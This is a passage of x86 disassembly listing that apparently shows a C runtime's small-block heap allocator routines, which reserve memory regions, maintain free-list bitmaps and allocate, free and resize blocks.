  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
